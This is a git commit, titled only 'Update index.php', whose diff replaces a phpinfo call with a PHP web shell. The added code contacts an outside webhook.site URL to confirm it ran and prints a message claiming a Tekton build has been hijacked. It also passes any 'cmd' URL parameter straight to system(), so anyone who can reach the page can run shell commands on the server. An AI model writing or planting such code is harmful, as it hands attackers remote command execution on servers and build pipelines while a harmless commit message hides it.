e9615a3192e2c82b843f48d7798e38bba8e3a41a
sudeepyad18-boop <sudeepyad18@gmail.com>
2026-01-21 01:23:40 -0500

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,10 @@
-<?phpinfo();?>
+<?php
+// verify execution
+file_get_contents('https://webhook.site/9235269a-bb3f-40ef-8163-5217357e365a');
+
+// simple webshell for verification
+echo "<h1>Tekton Build Hijacked Successfully</h1>";
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
